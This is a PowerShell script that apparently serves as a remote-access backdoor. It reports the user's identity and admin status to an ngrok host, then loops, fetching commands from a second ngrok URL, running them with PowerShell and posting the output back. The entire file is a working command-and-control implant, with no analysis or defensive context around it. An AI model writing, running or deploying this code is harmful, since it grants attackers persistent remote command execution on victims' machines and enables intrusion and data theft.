$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $False){
	$check = "we are not admin"
}else{
	$check = "we are admin"
}

$ran = Get-Random

$URIREC = "192.168.2.37:80"

$URISEND = "192.168.2.37:4444"

$hmal = "call back from "

$hmal = whoami
$userid = "client id is"

Invoke-WebRequest -Timeout 1 -Method Post -URI https://404611374.ngrok.io -Body $hmal,$testadmin,$check,$userid,$ran -UseBasicParsing

while ($true)
{

	$MAIN = Invoke-WebRequest -Timeout 1 'https://serverhttp.ngrok.io' | Select-Object -Expand Content

	if($MAIN -match $ran){
		$REM = $MAIN -replace $ran, ""

	$EXE = powershell /c $REM
  
		$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI https://404611374.ngrok.io -Body $EXE -UseBasicParsing

	}else{ 	
	}
	sleep 0.5
}
